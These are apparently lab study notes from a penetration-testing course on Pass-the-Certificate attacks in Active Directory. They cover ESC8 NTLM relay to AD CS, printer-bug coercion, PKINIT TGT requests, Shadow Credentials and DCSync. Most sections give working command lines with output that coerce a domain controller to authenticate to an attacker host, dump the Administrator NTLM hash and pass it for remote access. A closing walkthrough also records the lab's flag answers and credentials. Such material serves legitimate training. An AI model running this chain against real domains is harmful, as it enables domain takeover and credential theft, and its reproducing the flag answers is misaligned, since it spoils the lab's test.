[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange.
 It is typically used to support user logons via smart cards, which store the private keys. `Pass-the-Certificate` refers to the technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)`. This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

## AD CS NTLM Relay Attack (ESC8)

`ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:
![[Pasted image 20251009164055.png]]

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:
```shell
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
**Note:** The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).
```shell
certipy find -u wwhite -p package5shores_topher1 -dc-ip 10.129.225.219
```

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running. The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:
```shell
> python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for `DC01$`:
```shell-session
...
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled
...
```
We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:

Then, we can begin the attack.
**Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library: `pip3 install -I git+https://github.com/wbond/oscrypto.git

```shell
> python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

```shell
> export KRB5CCNAME=/tmp/dc.ccache
DONT FORGET TO ADD FQDN TO /etc/hosts
> impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
<SNIP>
```


---

## Shadow Credentials (msDS-KeyCredentialLink)
[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.
![[Pasted image 20251009170506.png]]

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:

```shell
> pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

...
[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
...
```

In the output above, we can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

```shell
> python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

...
INFO:minikerberos:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
...
```

With the TGT obtained, we may once again `pass the ticket`:
```shell
export KRB5CCNAME=/tmp/jpinkman.ccache
V0xD0x@htb[/htb]$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

In this case, we discovered that the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

```shell
> evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

---

## No PKINIT?
In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

---

### Question

Target(s): 10.129.225.219 (ACADEMY-PWATTCK-PTCDC01)
		10.129.234.172 (ACADEMY-PWATTCK-PTCCA01)
1. What are the contents of flag.txt on jpinkman's desktop?
```shell
We can access this endpoint: http://10.129.234.172/certsrv/Default.asp

We could try NTLM Relay attack (ESC8)

> ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

On other terminal:
> printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.225.219 10.10.14.237

On the listener:
[*] Authenticating against http://10.129.234.172 as INLANEFREIGHT/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.225.219, attacking target http://10.129.234.172
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[-] Authenticating against http://10.129.234.172 as / FAILED
[*] GOT CERTIFICATE! ID 13
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file

Perfect now we can get a tgt thanks to PKINIT:
> gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip 10.129.225.219 'inlanefreight.local/dc01$' /tmp/dc.ccache
> cp /tmp/dc.ccache .
> export KRB5CCNAME="$(pwd)/dc.ccache"
Add FQDN to /etc/hosts
> secretsdump -k -no-pass -dc-ip 10.129.225.219 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::

now we can perform a Pass the hash attack.

> evil-winrm -i 10.129.225.219 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
Go on jpinkman desktop then:
evin-winrm> cat flag.txt
3d7e3dfb56b200ef715cfc300f07f3f8
```

2. What are the contents of flag.txt on Administrator's desktop?
```shell
Go on Administrator Desktop then cat flag.txt:
a1fc497a8433f5a1b4c18274019a2cdb
```